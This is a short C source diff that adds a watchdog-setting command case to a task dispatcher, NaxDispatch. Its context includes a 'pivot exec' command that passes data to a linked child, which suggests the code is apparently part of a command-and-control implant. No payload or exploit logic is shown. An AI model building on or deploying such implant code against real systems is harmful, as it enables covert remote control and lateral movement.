@@ -165,6 +165,12 @@ FUNC INT NaxDispatch( PNAX_INSTANCE    Nax,
                              ? NAX_STATUS_OK : NAX_STATUS_ERR;
         return 1;
 
+    /* ---- CMD_WATCHDOG_SET (0x2C) ---- */
+    case NAX_CMD_WATCHDOG_SET:
+        *result_status = ( NaxCmdWatchdogSet( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len ) == NAX_OK )
+                             ? NAX_STATUS_OK : NAX_STATUS_ERR;
+        return 1;
+
     /* ---- CMD_PIVOT_EXEC (0x37) - write data to linked child ---- */
     case NAX_CMD_PIVOT_EXEC:
         CmdPivotExec( Nax, task->Args, (UINT32)task->ArgsLen, result_data, result_data_len );
